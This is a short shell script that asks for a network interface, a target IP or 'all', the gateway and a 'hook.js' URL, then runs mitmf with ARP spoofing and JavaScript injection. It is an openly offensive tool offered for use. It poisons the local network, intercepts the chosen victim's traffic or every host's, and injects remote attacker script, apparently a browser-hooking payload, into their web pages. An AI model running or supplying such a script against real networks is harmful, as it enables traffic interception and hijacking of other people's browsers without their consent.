#!/bin/sh


# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Default
DefaultColor='\e[39m'   # Default foreground color




####################################################
    ########Get the network interface########
####################################################
echo  " Enter your network interface:"
 read interface
  echo " ==================================================================================== "

#get the target ip 
echo "Type you target ip (if you want to set the all network just put all )" 
 read target
  echo " ==================================================================================== "

#get the gateway ip
echo " Type your Gateway (router ip):"
 read gateway
  echo " ==================================================================================== "

#get the hook.js URL
echo " Type the hook.js url:"
 read hook
  echo " ==================================================================================== "
  echo " ok ! now we will do all the work for you  "
 cd
 
if [ $target = all ]
  then
    mitmf --spoof --arp -i $interface --gateway $gateway   --inject --js-url $hook
  else
    mitmf --spoof --arp -i $interface --gateway $gateway --target $target  --inject --js-url $hook

fi
